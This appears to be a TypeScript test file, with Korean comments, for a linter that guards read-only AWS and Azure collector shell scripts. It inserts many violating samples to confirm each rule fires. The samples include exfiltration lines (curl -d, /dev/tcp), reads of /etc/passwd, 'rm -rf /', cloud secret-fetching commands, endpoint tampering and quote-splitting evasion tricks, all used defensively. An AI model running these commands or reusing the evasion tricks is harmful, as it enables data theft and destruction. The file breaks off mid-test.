// src/lib/cloudcheck/collector/lint.test.ts — 수집기 린터 테스트 (G4: L-01~L-14 위반 0 + '린터의 린터' + bash 3.2 기준선 + jq 1.6 호환)
//  1) 실제 수집기 2종은 위반 0이고 호출 집합이 카탈로그와 완전히 같다
//  2) 린터의 린터: 규칙마다 위반 샘플을 실제 스크립트에 끼워 넣어 반드시 잡히는지 본다(샘플이 없는 규칙이 있으면 실패)
//  3) 토크나이저·jq 검사기 단위 테스트, 바이트 규칙, 부분 복붙 안전성(잘린 파일은 아무것도 실행하지 않는다)
import { spawnSync } from "node:child_process";
import { readFileSync } from "node:fs";
import { describe, expect, it, vi } from "vitest";
import { AWS_CALLS, AZURE_CALLS } from "../contract/calls";
import { findBanned } from "../model/banned-words";
import { LINT_RULES, LOCAL_VERSION_ARGS, MAX_LINES, SECRET_COMMANDS, catalogCli, checkJq, lexShell, lintCollector, parseShell } from "./lint";
import type { Cloud, LintRuleId } from "./lint";
import { SECTION_MARKER_RE, SECTION_MARKER_SOURCE, SECTION_IDS, splitSections } from "./markers";
import { SCRIPT_PATH, runCollector } from "./testkit";
import { awsBase } from "./__scenarios__";
import { azureBase } from "./__scenarios__";

vi.setConfig({ testTimeout: 60_000 });
const SRC: Record<Cloud, string> = { aws: readFileSync(SCRIPT_PATH.aws, "utf8"), azure: readFileSync(SCRIPT_PATH.azure, "utf8") };
const CLOUDS: readonly Cloud[] = ["aws", "azure"];

describe("실제 수집기: 린트 위반 0", () => {
  for (const cloud of CLOUDS) {
    it(`${cloud}: L-01~L-14 위반 0 · ${MAX_LINES}줄 이하`, () => {
      const r = lintCollector(SRC[cloud], cloud);
      expect(r.findings, JSON.stringify(r.findings, null, 1)).toEqual([]);
      expect(r.lineCount).toBeLessThanOrEqual(MAX_LINES);
    });
    it(`${cloud}: 호출 집합 = 카탈로그 집합(완전 일치) · 라벨 = 카탈로그 키 · 호출 줄마다 고유 마커`, () => {
      const r = lintCollector(SRC[cloud], cloud);
      const catalog = cloud === "aws" ? AWS_CALLS : AZURE_CALLS;
      const local = new Set(Object.entries(LOCAL_VERSION_ARGS).map(([t, a]) => `${t} ${a}`));
      expect(r.cliSet.filter((c) => !local.has(c))).toEqual(catalogCli(cloud));
      expect(new Set(r.calls.map((c) => c.label))).toEqual(new Set(Object.keys(catalog)));
      expect(r.markers).toHaveLength(r.calls.length);
      expect(r.calls.every((c) => c.label !== null && c.cli !== null)).toBe(true);
    });
  }
  it("AWS 26종 · Azure 9종, 호출 줄의 라벨이 카탈로그 cli와 짝이다", () => {
    expect(catalogCli("aws")).toHaveLength(26);
    expect(catalogCli("azure")).toHaveLength(9);
    for (const cloud of CLOUDS) {
      const catalog = cloud === "aws" ? AWS_CALLS : AZURE_CALLS;
      for (const c of lintCollector(SRC[cloud], cloud).calls) expect(Object.entries(catalog).find(([k]) => k === c.label)?.[1].cli).toBe(c.cli);
    }
  });
  it("비밀 반환 금지 목록 ∩ 허용 목록 = ∅ (두 곳을 함께 고쳐야만 추가할 수 있다)", () => {
    const allowed = new Set([...catalogCli("aws"), ...catalogCli("azure")]);
    const hits = SECRET_COMMANDS.filter((s) => [...allowed].some((a) => a === s || a.startsWith(`${s} `)));
    expect(hits).toEqual([]);
    expect(SECRET_COMMANDS.length).toBeGreaterThanOrEqual(40);
  });
  it("쓰기 호출은 iam generate-credential-report 1건뿐(수집기 두 개를 합쳐서)", () => {
    const writes = [...Object.values(AWS_CALLS), ...Object.values(AZURE_CALLS)].filter((m) => !m.readOnly).map((m) => m.cli);
    expect(writes).toEqual(["aws iam generate-credential-report"]);
  });
});

describe("바이트 규칙(L-01·L-02)과 표식", () => {
  for (const cloud of CLOUDS) {
    it(`${cloud}: UTF-8 · BOM 없음 · LF만 · 끝에 줄바꿈 1개 · main \"$@\"가 마지막 줄 · bash -n 통과`, () => {
      const buf = readFileSync(SCRIPT_PATH[cloud]);
      expect(buf.toString("utf8")).toBe(SRC[cloud]);
      expect(Buffer.from(SRC[cloud], "utf8").equals(buf)).toBe(true);   // 잘못된 UTF-8이 섞여 있지 않다
      expect(buf[0]).not.toBe(0xef);
      expect(SRC[cloud].includes("\r")).toBe(false);
      expect(SRC[cloud].endsWith('main "$@"\n')).toBe(true);
      expect(SRC[cloud].endsWith("\n\n")).toBe(false);
      const syn = spawnSync("/bin/bash", ["-n", SCRIPT_PATH[cloud]], { encoding: "utf8" });
      expect([syn.status, syn.stderr]).toEqual([0, ""]);
    });
    it(`${cloud}: 구간 표식이 있고 모든 줄이 어느 구간에 속한다(페이지 접기용 · 정규식 상수 1개)`, () => {
      const sections = splitSections(SRC[cloud]);
      expect(sections.length).toBeGreaterThanOrEqual(6);
      expect(sections.every((s) => (SECTION_IDS as readonly string[]).includes(s.id))).toBe(true);
      expect(new Set(sections.map((s) => s.id)).size).toBe(sections.length);
      expect(sections[0].id).toBe("common");
      expect(sections[sections.length - 1].endLine).toBe(SRC[cloud].split("\n").length);
      const viaSource = SRC[cloud].match(new RegExp(SECTION_MARKER_SOURCE, "gm")) ?? [];
      expect(viaSource).toHaveLength(sections.length);
      for (const l of viaSource) expect(SECTION_MARKER_RE.test(l)).toBe(true);
    });
    it(`${cloud}: 주석·화면 문구에 금지어(안전·통과·완료·% 등)가 없다`, () => {
      const lexed = lexShell(SRC[cloud]);
      const texts = [...lexed.comments.map((c) => c.text).filter((t) => !t.startsWith("#!")), ...lexed.toks.flatMap((t) => (t.kind === "word" && /[가-힣]/.test(t.raw) ? [t.text] : []))];
      expect(texts.length).toBeGreaterThan(30);
      const hits = texts.flatMap((t) => findBanned(t).map((h) => `${h.label}:${h.match} ← ${t.slice(0, 60)}`));
      expect(hits).toEqual([]);
    });
    it(`${cloud}: 수집기 주석은 한국어(호출 표식 줄마다 한글이 있다)`, () => {
      const markers = SRC[cloud].split("\n").filter((l) => /^\s*# @cc:(?!section)/.test(l));
      expect(markers.length).toBeGreaterThan(5);
      for (const m of markers) expect(m).toMatch(/[가-힣]/);
    });
  }
  it("이 맥의 /bin/bash는 3.2 기준선이다(shim 테스트가 곧 bash 3.2 테스트)", () => {
    const v = spawnSync("/bin/bash", ["--version"], { encoding: "utf8" }).stdout.split("\n")[0];
    if (process.platform === "darwin") expect(v).toMatch(/version 3\.2\./);
    else expect(v).toMatch(/version \d+\./);
  });
});

/* ───────── 린터의 린터 ───────── */
type Mut = (s: string) => string;
const CH = (cp: number): string => String.fromCodePoint(cp);   // 숨은 문자는 코드 포인트로만 적는다(테스트 원문에 보이지 않는 문자를 넣지 않는다)
// 치환 문자열의 $' $& 같은 특수 패턴이 샘플을 망치지 않도록 항상 함수 치환을 쓴다
const beforeMain = (line: string): Mut => (s) => s.replace(/\nmain "\$@"\n$/, () => `\n${line}\nmain "$@"\n`);
const replaceOnce = (a: string | RegExp, b: string): Mut => (s) => { const out = s.replace(a, () => b); if (out === s) throw new Error(`치환 대상 없음: ${String(a)}`); return out; };
const dropLine = (re: RegExp): Mut => (s) => { const lines = s.split("\n"); const i = lines.findIndex((l) => re.test(l)); if (i < 0) throw new Error(`줄 없음: ${String(re)}`); lines.splice(i, 1); return lines.join("\n"); };
const dropLineAndMarker = (re: RegExp): Mut => (s) => { const lines = s.split("\n"); const i = lines.findIndex((l) => re.test(l)); if (i < 0) throw new Error(`줄 없음: ${String(re)}`); lines.splice(i - 1, 2); return lines.join("\n"); };
const dupLine = (re: RegExp): Mut => (s) => { const lines = s.split("\n"); const i = lines.findIndex((l) => re.test(l)); if (i < 0) throw new Error(`줄 없음: ${String(re)}`); lines.splice(i, 0, lines[i]); return lines.join("\n"); };
const markerFor = (id: string): string => `# @cc:test.${id} 시험용 호출`;
interface Sample { readonly name: string; readonly rule: LintRuleId; readonly code?: string; readonly clouds?: readonly Cloud[]; readonly mut: Mut }
const S = (name: string, rule: LintRuleId, code: string | undefined, mut: Mut, clouds?: readonly Cloud[]): Sample => ({ name, rule, code, mut, clouds });
const CALL_LINE_AWS = (label: string, cli: string, extra = "--output json"): string => `${markerFor(label.replace(/[^a-z]/gi, "").toLowerCase())}\ncall ${label} global - - '.' -- ${cli} ${extra}`;

const SAMPLES: readonly Sample[] = [
  // L-01
  S("shebang이 다르다", "L-01", "shebang", replaceOnce("#!/usr/bin/env bash", "#!/bin/bash")),
  S("set -euo pipefail 없음", "L-01", "header", dropLine(/^set -euo pipefail$/)),
  S("umask 077 없음", "L-01", "header", dropLine(/^umask 077$/)),
  S("마지막 줄이 main이 아님", "L-01", "last-line", (s) => `${s}echo done\n`),
  S("260줄 초과", "L-01", "length", beforeMain(Array.from({ length: 80 }, (_, i) => `# 여분 줄 ${i}`).join("\n"))),
  S("CR 문자", "L-01", "cr", replaceOnce("set -euo pipefail", "set -euo pipefail\r")),
  S("닫히지 않은 큰따옴표", "L-01", "syntax", beforeMain('say "닫히지 않음')),
  S("닫히지 않은 작은따옴표", "L-01", "syntax", beforeMain("say 'oops")),
  // L-02
  S("BOM", "L-02", "bom", (s) => `${CH(0xfeff)}${s}`),
  S("bidi 오버라이드 U+202E(주석 안)", "L-02", "invisible-char", replaceOnce("# 안내는 표준 오류로만", `# 안내는${CH(0x202e)} 표준 오류로만`)),
  S("zero-width space U+200B(코드 안)", "L-02", "invisible-char", replaceOnce("umask 077", `umask${CH(0x200b)} 077`)),
  S("한글 채움 문자 U+3164", "L-02", "invisible-char", replaceOnce("say() {", `say${CH(0x3164)}() {`)),
  S("제어 문자 BEL", "L-02", "control-char", replaceOnce("umask 077", `umask 077${CH(7)}`)),
  S("따옴표 밖 비ASCII 단어(키릴 j)", "L-02", "non-ascii-code", beforeMain(`${CH(0x458)}q --version`)),
  // L-03
  S("행 끝 주석", "L-03", "inline-comment", replaceOnce("umask 077", "umask 077 # 권한")),
  S("호출 줄 위에 마커 없음", "L-03", "call-without-marker", dropLine(/^ {2}# @cc:identity\.(caller|account) /)),
  S("마커 ID 중복", "L-03", "marker-duplicate", dupLine(/^ {2}# @cc:identity\.(caller|account) /)),
  S("마커에 한글이 없음", "L-03", "marker-not-korean", beforeMain("# @cc:test.english only english")),
  S("마커 형식 오류", "L-03", "marker-format", beforeMain("# @cc:Bad_Marker x")),
  // L-04
  S("래퍼 밖의 aws/az 호출", "L-04", "aws-outside-call", (s) => beforeMain(s.includes("-- az ") ? "az account list -o json --only-show-errors" : "aws iam list-users --output json")(s)),
  S("$(…) 안의 비밀 명령(프로토타입에서 뚫렸던 우회)", "L-04", "aws-outside-call", (s) => beforeMain(s.includes("-- az ") ? "x=$(az keyvault secret show --name s)" : "x=$(aws secretsmanager get-secret-value --secret-id s --output json)")(s)),
  S("백틱 명령 치환", "L-10", "backtick", (s) => beforeMain(s.includes("-- az ") ? "x=`az account show`" : "x=`aws sts get-caller-identity`")(s)),
  S("큰따옴표 안의 $(aws …)", "L-04", "aws-outside-call", (s) => beforeMain(s.includes("-- az ") ? 'say "$(az account list)"' : 'say "$(aws iam list-users)"')(s)),
  S("파이프 뒤의 aws", "L-04", "aws-outside-call", (s) => beforeMain(s.includes("-- az ") ? "printf x | az account list" : "printf x | aws iam list-users")(s)),
  S("call 대상이 aws/az가 아님", "L-04", "call-target-not-cli", beforeMain("call x:Y global - - '.' -- $CLI iam list-users --output json")),
  S("라벨이 리터럴이 아님", "L-04", "label-not-literal", beforeMain('call "$L" global - - \'.\' -- aws sts get-caller-identity --output json')),
  S("-- 구분자 없음", "L-04", "no-double-dash", beforeMain("call x:Y global - - '.'")),
  // L-05
  S("카탈로그에 없는 명령", "L-05", "not-allowlisted", (s) => beforeMain(s.includes("-- az ") ? `${markerFor("vm")}\ncall azure:vm.list - - length '.' -- az vm list -o json --only-show-errors` : CALL_LINE_AWS("iam:ListVirtualMFADevices", "aws iam list-virtual-mfa-devices"))(s)),
  S("라벨 ≠ 카탈로그 키", "L-05", "label-mismatch", replaceOnce(/call (sts:GetCallerIdentity|azure:account\.show)/, "call iam:ListUsers")),
  S("--output json 없음(AWS) / -o json 없음(Azure)", "L-05", "output-json", (s) => s.replace(/ --output json( |$)/m, "$1").replace(/(-- az [^\n]*?) -o json /, (_m, a: string) => `${a} `)),
  S("카탈로그 호출 하나를 안 부름", "L-05", "catalog-unused", dropLineAndMarker(/call iam:ListRoles|call azure:network\.public-ip\.list/)),
  S("쓰기 동사", "L-05", "write-verb", (s) => beforeMain(s.includes("-- az ") ? `${markerFor("del")}\ncall azure:network.nsg.list - - length '.' -- az network nsg delete -o json --only-show-errors` : CALL_LINE_AWS("iam:ListUsers", "aws iam delete-user"))(s)),
  S("다른 클라우드의 CLI", "L-05", "wrong-cloud-cli", (s) => beforeMain(s.includes("-- az ") ? CALL_LINE_AWS("iam:ListUsers", "aws iam list-users") : `${markerFor("az")}\ncall azure:account.list - - length '.' -- az account list -o json --only-show-errors`)(s)),
  // L-06
  S("secretsmanager get-secret-value", "L-06", "secret-command", beforeMain(CALL_LINE_AWS("secretsmanager:GetSecretValue", "aws secretsmanager get-secret-value --secret-id s")), ["aws"]),
  S("ssm get-parameter", "L-06", "secret-command", beforeMain(CALL_LINE_AWS("ssm:GetParameter", "aws ssm get-parameter --with-decryption --name p")), ["aws"]),
  S("sts assume-role", "L-06", "secret-command", beforeMain(CALL_LINE_AWS("sts:AssumeRole", "aws sts assume-role --role-arn r")), ["aws"]),
  S("az storage account keys list", "L-06", "secret-command", beforeMain(`${markerFor("keys")}\ncall azure:storage.account.list - - length '.' -- az storage account keys list -o json --only-show-errors`), ["azure"]),
  S("az storage blob(데이터 평면)", "L-06", "secret-command", beforeMain(`${markerFor("blob")}\ncall azure:storage.account.list - - length '.' -- az storage blob list -o json --only-show-errors`), ["azure"]),
  S("az account get-access-token", "L-06", "secret-command", beforeMain("az account get-access-token"), ["azure"]),
  // L-07
  S("허용 목록에 없는 외부 명령", "L-07", "command-not-allowed", beforeMain('basename "$0"')),
  S("변수를 명령으로 실행", "L-07", "dynamic-command", beforeMain("$CMD arg")),
  S("따옴표 친 변수를 명령으로 실행", "L-07", "quoted-command", beforeMain('"$CMD" arg')),
  S("trap으로 숨은 명령", "L-07", "trap-not-allowed", replaceOnce(`trap 'rm -rf "$TMP" "$OUT_TMP"' EXIT`, `trap 'rm -rf "$TMP" "$OUT_TMP"; aws iam list-users' EXIT`)),
  S("command 내장으로 aws 실행", "L-07", "command-builtin", beforeMain("command aws iam list-users")),
  S("date에 다른 인자", "L-07", "date-args", beforeMain("date -d yesterday")),
  S("sleep에 숫자가 아닌 인자", "L-07", "sleep-args", beforeMain("sleep infinity")),
  // L-08
  ...["curl http://example.com/x", "wget http://example.com/x", "nc 203.0.113.1 80", "ncat 203.0.113.1 80", "socat - TCP:203.0.113.1:80", "ssh user@203.0.113.1", "scp a b:c", "rsync a b:c",
    "openssl s_client -connect 203.0.113.1:443", "dig example.com", "nslookup example.com", "ping 203.0.113.1", "python3 -c 1", "perl -e 1", "ruby -e 1", "node -e 1", "php -r 1", "pwsh -c 1",
    "awk '{print}' x", "sed -e s/a/b/ x", "xargs echo", "eval echo", "source ./x", ". ./x", "alias a=b", "sudo id", "nohup true", "base64 -d x", "xxd x", "od x", "gzip x", "zcat x", "bash -c true", "sh -c true", "git status", "tar xf x"]
    .map((cmd) => S(`금지 도구: ${cmd.split(" ")[0]}`, "L-08", "forbidden-tool", beforeMain(cmd))),
  S("/dev/tcp로 송신", "L-08", "dev-tcp", beforeMain('printf x >/dev/tcp/203.0.113.1/80')),
  S("프로세스 치환 안의 curl", "L-08", "forbidden-tool", beforeMain("cat <(curl http://example.com/x)")),
  S("프로세스 치환 금지", "L-14", "process-substitution", beforeMain("cat <(say x)")),
  S("${…:-$(curl …)} 안에 숨은 명령 치환", "L-08", "forbidden-tool", beforeMain('say "${TMP:-$(curl http://example.com/x)}"')),
  S("산술 $(( $(curl …) )) 안에 숨은 명령 치환", "L-08", "forbidden-tool", beforeMain("say $(( $(curl http://example.com/x) + 1 ))")),
  S("따옴표를 쪼개 쓴 명령 c\"ur\"l", "L-07", "quoted-command", beforeMain('c"ur"l http://example.com/x')),
  S("ANSI-C 따옴표 명령", "L-07", "quoted-command", beforeMain("$'\\x63url' http://example.com/x")),
  S("줄 이음으로 쪼갠 명령", "L-08", "forbidden-tool", beforeMain("cu\\\nrl http://example.com/x")),
  S("중괄호 묶음 안의 curl", "L-08", "forbidden-tool", beforeMain("{ curl http://example.com/x; }")),
  S("서브셸 안의 curl", "L-08", "forbidden-tool", beforeMain("(curl http://example.com/x)")),
  S("&& 뒤의 curl", "L-08", "forbidden-tool", beforeMain("true && curl http://example.com/x")),
  S("time 뒤의 curl", "L-08", "forbidden-tool", beforeMain("time curl http://example.com/x")),
  S("느낌표 뒤의 curl", "L-08", "forbidden-tool", beforeMain("! curl http://example.com/x")),
  S("if 조건 안의 curl", "L-08", "forbidden-tool", beforeMain("if curl http://example.com/x; then say x; fi")),
  S("읽기 리다이렉트로 임의 파일 읽기", "L-14", "redirect-target", beforeMain("read -r x </etc/passwd")),
  S("파이프 뒤의 curl", "L-08", "forbidden-tool", beforeMain('cat "$TMP/val" | curl -d @- http://example.com')),
  // L-09
  S("/dev/null로 오류 삼키기", "L-09", "dev-null", beforeMain('jq . "$TMP/out" 2>/dev/null')),
  S("|| true", "L-09", "or-not-rc", beforeMain('jq . "$TMP/out" || true')),
  S("|| :", "L-09", "or-not-rc", beforeMain('jq . "$TMP/out" || :')),
  S("|| echo", "L-09", "or-not-rc", beforeMain('jq . "$TMP/out" || say 무시')),
  S("줄 끝 ||", "L-09", "trailing-or", beforeMain('jq . "$TMP/out" ||\n  say x')),
  S("set +e", "L-09", "set-plus", beforeMain("set +e")),
  S("2>&-", "L-09", "close-fd", beforeMain('jq . "$TMP/out" 2>&-')),
  // L-10
  ...["env", "printenv", "compgen -v", "history", "declare -p", "typeset -p", "unset PATH", "readonly X=1", "hash -r", "shopt -s nullglob", "ls", "grep a b", "tr a b", "cd /"].map((cmd) => S(`덤프·탈출 명령: ${cmd}`, "L-10", "dump-or-escape-command", beforeMain(cmd))),
  S("단독 set", "L-10", "bare-set", beforeMain("set")),
  S("set -x(추적)", "L-10", "set-trace", beforeMain("set -x")),
  S("export -p", "L-10", "export-flag", beforeMain("export -p")),
  S("허용 밖 export", "L-10", "export-not-allowlisted", beforeMain("export FOO=1")),
  S("PATH 대입", "L-10", "assign-denied", beforeMain("PATH=/tmp/x:$PATH")),
  S("AWS_PROFILE 접두 대입으로 계정 바꾸기", "L-10", "assign-denied", beforeMain("AWS_PROFILE=other say hi")),
  S("IFS를 read 밖에서 바꿈", "L-10", "ifs-assign", beforeMain("IFS=,")),
  S("간접 참조 ${!x}", "L-10", "indirect-expansion", beforeMain('say "${!TMP}"')),
  S("jq() 재정의", "L-10", "redefine-command", beforeMain("jq() { :; }")),
  S("aws() 재정의", "L-10", "redefine-command", beforeMain("aws() { :; }")),
  S("cat() 재정의", "L-10", "redefine-command", beforeMain("cat() { :; }")),
  // L-11
  S("--endpoint-url", "L-11", "endpoint-tamper", replaceOnce("--output json", "--output json --endpoint-url http://203.0.113.1"), ["aws"]),
  S("--debug", "L-11", "endpoint-tamper", replaceOnce(/--output json/, "--output json --debug"), ["aws"]),
  S("--no-verify-ssl", "L-11", "endpoint-tamper", replaceOnce(/--output json/, "--output json --no-verify-ssl"), ["aws"]),
  S("--ca-bundle", "L-11", "endpoint-tamper", replaceOnce(/--output json/, "--output json --ca-bundle /tmp/x"), ["aws"]),
  S("--debug(az)", "L-11", "endpoint-tamper", replaceOnce("-o json --only-show-errors", "-o json --only-show-errors --debug"), ["azure"]),
  S("HTTPS_PROXY 설정", "L-11", "endpoint-tamper", beforeMain("export HTTPS_PROXY=http://203.0.113.1:8080")),
  S("AWS_ENDPOINT_URL_S3", "L-11", "endpoint-tamper", beforeMain("AWS_ENDPOINT_URL_S3=http://203.0.113.1 say x")),
  S("az cloud set", "L-11", "endpoint-tamper", beforeMain("az cloud set --name x")),
  S("AZURE_CLI_DISABLE_CONNECTION_VERIFICATION", "L-11", "endpoint-tamper", beforeMain("export AZURE_CLI_DISABLE_CONNECTION_VERIFICATION=1")),
  S("엔드포인트 고정 해제(=false)", "L-11", "endpoint-guard", replaceOnce("AWS_IGNORE_CONFIGURED_ENDPOINT_URLS=true", "AWS_IGNORE_CONFIGURED_ENDPOINT_URLS=false"), ["aws"]),
  S("엔드포인트 고정 줄 삭제", "L-11", "endpoint-guard", replaceOnce(" AWS_IGNORE_CONFIGURED_ENDPOINT_URLS=true", ""), ["aws"]),
  S("az --version 복귀(최신 버전을 인터넷에서 조회)", "L-04", "aws-outside-call", replaceOnce("az version -o json --only-show-errors", "az --version"), ["azure"]),
  // L-12
  S("declare -A", "L-12", "declare-flag", beforeMain("declare -A m")),
  S("local -n", "L-12", "declare-flag", beforeMain("f() { local -n r=x; }")),
  S("mapfile", "L-12", "bash4-builtin", beforeMain('mapfile -t a <"$TMP/val"')),
  S("readarray", "L-12", "bash4-builtin", beforeMain('readarray -t a <"$TMP/val"')),
  S("${x,,}", "L-12", "case-modify", beforeMain('say "${TMP,,}"')),
  S("${x^^}", "L-12", "case-modify", beforeMain('say "${TMP^^}"')),
  S("[[ -v x ]]", "L-12", "test-v", beforeMain("if [[ -v TMP ]]; then say x; fi")),
  S("coproc", "L-12", "bash4-builtin", beforeMain("coproc X { :; }")),
  S(";;&", "L-12", "bash4-syntax", beforeMain('case x in x) say a ;;& esac')),
  S("|&", "L-12", "bash4-syntax", beforeMain("say x |& cat")),
  S("&>>", "L-12", "amp-redirect", beforeMain('say x &>>"$TMP/x"')),
  S("wait -n", "L-12", "bash4-syntax", beforeMain("wait -n")),
  S("$EPOCHSECONDS", "L-12", "bash4-syntax", beforeMain('say "$EPOCHSECONDS"')),
  S("배열 대입", "L-12", "array", beforeMain("a=(1 2 3)")),
  S("배열 확장 ${a[@]}", "L-12", "array", beforeMain('say "${a[@]}"')),
  S("printf '%(…)T'", "L-12", "bash4-syntax", beforeMain("printf '%(%s)T' -1")),
  S("read -a", "L-12", "read-option", beforeMain('read -a arr <"$TMP/val"')),
  // L-13
  S("jq: else 없는 if", "L-13", "if-without-else", beforeMain('jq -c \'if . then 1 end\' "$TMP/v"')),
  S("jq: 호출 투영의 else 없는 if", "L-13", "if-without-else", replaceOnce("'{state: .State}'", "'{state: (if .State == \"x\" then 1 end)}'"), ["aws"]),
  S("jq: pick (1.7+)", "L-13", "jq17-only", beforeMain('jq -c \'pick(.a)\' "$TMP/v"')),
  S("jq: abs (1.7+)", "L-13", "jq17-only", beforeMain('jq -c \'abs\' "$TMP/v"')),
  S("jq: toarray (1.7+)", "L-13", "jq17-only", beforeMain('jq -c \'toarray\' "$TMP/v"')),
  S("jq: trim (1.7+)", "L-13", "jq17-only", beforeMain('jq -c \'trim\' "$TMP/v"')),
  S("jq: have_decnum (1.7+)", "L-13", "jq17-only", beforeMain('jq -c \'have_decnum\' "$TMP/v"')),
  S("jq: @base32d (1.7+)", "L-13", "jq17-only", beforeMain('jq -c \'@base32d\' "$TMP/v"')),
  S("jq: $__loc__ (1.7+)", "L-13", "jq17-only", beforeMain('jq -c \'$__loc__\' "$TMP/v"')),
  S("jq: scan/2 (1.7+)", "L-13", "jq17-only", beforeMain('jq -c \'scan("a"; "g")\' "$TMP/v"')),
  S("jq: add(f) (1.7+)", "L-13", "jq17-only", beforeMain('jq -c \'add(.a)\' "$TMP/v"')),
  S("jq: env", "L-13", "jq-denied", beforeMain('jq -nc \'env\'')),
  S("jq: $ENV", "L-13", "jq-denied", beforeMain('jq -nc \'$ENV\'')),
  S("jq: input", "L-13", "jq-denied", beforeMain('jq -nc \'input\'')),
  S("jq: debug", "L-13", "jq-denied", beforeMain('jq -c \'debug\' "$TMP/v"')),
  S("jq: stderr", "L-13", "jq-denied", beforeMain('jq -c \'stderr\' "$TMP/v"')),
  S("jq: 프로그램이 리터럴이 아님", "L-13", "jq-program-not-literal", beforeMain('jq -c "$X" "$TMP/v"')),
  S("jq: -f 프로그램 파일", "L-13", "jq-option", beforeMain('jq -f prog.jq "$TMP/v"')),
  S("jq: 알 수 없는 옵션", "L-13", "jq-option", beforeMain('jq --stream . "$TMP/v"')),
  S("호출 투영이 리터럴이 아님", "L-13", "jq-program-not-literal", replaceOnce("'{state: .State}'", '"$X"'), ["aws"]),
  // L-14
  S("리다이렉트 대상이 임시 디렉터리 밖", "L-14", "redirect-target", beforeMain("say x >out.txt")),
  S("홈 디렉터리에 쓰기", "L-14", "redirect-target", beforeMain('say x >>"$HOME/.bashrc"')),
  S("$TMP 밖 절대 경로에 쓰기", "L-14", "redirect-target", beforeMain("say x > /tmp/leak")),
  S("파일 번호 복제 2>&3", "L-14", "redirect-fd", beforeMain("say x 2>&3")),
  S("here-document", "L-14", "heredoc", beforeMain("cat <<EOF\nx\nEOF")),
  S("here-string", "L-14", "heredoc", beforeMain("read -r a <<<x")),
  S("cat으로 임의 파일 읽기", "L-14", "cat-operand", beforeMain("cat /etc/passwd")),
  S("head로 임의 파일 읽기", "L-14", "head-operand", beforeMain("head -c 10 /etc/passwd")),
  S("rm으로 다른 것 지우기", "L-14", "rm-operand", beforeMain("rm -rf /")),
  S("mv 두 번째", "L-14", "mv-operand", beforeMain('mv "$TMP/val" "$HOME/x"')),
  S("mv 없음", "L-14", "mv-count", replaceOnce(/^ {2}mv "\$OUT_TMP" "\$out"; OUT_TMP=""$/m, '  OUT_TMP=""')),
  S("mktemp를 다른 경로에", "L-14", "mktemp-operand", beforeMain("mktemp /tmp/x.XXXXXX")),
  S("sha256sum으로 임의 파일", "L-14", "sha-operand", beforeMain("sha256sum /etc/passwd")),
  S("jq가 임시 디렉터리 밖 파일을 읽음", "L-14", "jq-file-operand", beforeMain("jq -c . /etc/passwd")),
  S("jq --slurpfile이 밖의 파일을 읽음", "L-14", "jq-file-operand", beforeMain("jq -n --slurpfile x /etc/passwd '$x'")),
];

describe("린터의 린터: 규칙마다 위반 샘플이 반드시 잡힌다", () => {
  it("14개 규칙 모두에 샘플이 있다", () => {
    const covered = new Set(SAMPLES.map((s) => s.rule));
    for (const r of LINT_RULES) expect(covered.has(r.id), `${r.id}에 위반 샘플이 없다`).toBe(true);
    expect(SAMPLES.length).toBeGreaterThanOrEqual(120);
  });
  for (const s of SAMPLES) {
    for (const cloud of s.clouds ?? CLOUDS) {
      it(`[${s.rule}${s.code ? `/${s.code}` : ""}] ${cloud}: ${s.name}`, () => {
        const bad = s.mut(SRC[cloud]);
        expect(bad).not.toBe(SRC[cloud]);
        const r = lintCollector(bad, cloud);
        const hit = r.findings.some((f) => f.rule === s.rule && (s.code === undefined || f.code === s.code));
        expect(hit, `${s.rule}${s.code ? `/${s.code}` : ""} 가 잡히지 않았다. 실제 결과: ${JSON.stringify(r.findings.map((f) => `${f.rule}/${f.code}@${f.line}`))}`).toBe(true);
      });
    }
  }
  it("대조군: 샘플을 끼우지 않은 원본은 위반 0이다", () => {
    for (const cloud of CLOUDS) expect(lintCollector(SRC[cloud], cloud).findings).toEqual([]);
  });
  it("|| rc=$? 형태와 정상 case/for/function 구문은 오탐하지 않는다", () => {
    const ok = beforeMain(`jq '.' "$TMP/out" >"$TMP/v" 2>"$TMP/err" || rc=$?`);
    for (const cloud of CLOUDS) expect(lintCollector(ok(SRC[cloud]), cloud).findings).toEqual([]);
  });
});

describe("토크나이저 · 명령 파서", () => {
  it("따옴표·$(…)·${…}·산술을 단어 하나로 읽고, 작은따옴표 안은 불투명하게 둔다", () => {
    const { toks } = lexShell(`x="a b $(date -u +%Y) \${V:-d} $((1 + 2))" y='q "r" $(z)' z=\\;w`);
    const words = toks.filter((t) => t.kind === "word");
    expect(words.map((w) => w.kind === "word" && w.text)).toEqual(["x=a b $S $V $A", "y=q \"r\" $(z)", "z=;w"]);
    expect(words[0].kind === "word" && words[0].subs).toEqual(["date -u +%Y"]);
    expect(words[1].kind === "word" && words[1].subs).toEqual([]);
  });
  it("리다이렉트는 파일 번호 접두까지 연산자 하나로 읽는다(2>, 2>&1, >&2, >>)", () => {
    const ops = lexShell('a 2>"$TMP/e" >>"$TMP/r" 2>&1 >&2 <"$TMP/i"').toks.filter((t) => t.kind === "op").map((t) => (t.kind === "op" ? t.op : ""));
    expect(ops).toEqual(["2>", ">>", "2>&", ">&", "<"]);
  });
  it("명령 치환 안의 명령도 별도 명령으로 파싱한다", () => {
    const p = parseShell('x=$(aws secretsmanager get-secret-value --secret-id s)\ny="$(jq -r . "$TMP/a")"');
    expect(p.cmds.map((c) => c.name).filter(Boolean).sort()).toEqual(["aws", "jq"]);
  });
  it("case 패턴(| 와 ) 포함)은 명령으로 읽지 않고, 분기 안의 명령은 읽는다", () => {
    const p = parseShell('case "$CODE" in\n  A|B) RESULT=x ;;\n  *) say y ;;\nesac');
    expect(p.cmds.filter((c) => c.name !== "").map((c) => c.name)).toEqual(["say"]);
    expect(p.cmds.flatMap((c) => c.assigns.map((a) => a.raw))).toEqual(["RESULT=x"]);
  });
  it("함수 정의 이름을 모으고, 접두 대입(IFS= read)과 [[ … ]] 안의 && ||는 명령 경계로 읽지 않는다", () => {
    const p = parseShell('f() { local a=1; }\nIFS="|" read -r x y\nif [[ -n $a && -n $b ]]; then say ok; fi');
    expect(p.defs).toEqual(["f"]);
    expect(p.cmds.map((c) => c.name)).toEqual(["local", "read", "[[", "say"]);
    expect(p.orOps).toEqual([]);
  });
  it("|| 연산자는 다음 단어와 함께 기록한다", () => {
    expect(parseShell("a || rc=$?\nb || true").orOps.map((o) => o.next)).toEqual(["rc=$?", "true"]);
  });
  it("행 끝 주석과 줄 전체 주석을 구별한다", () => {
    const { comments } = lexShell("# 줄 전체\nset -e # 행 끝\nx=${#y}\n");
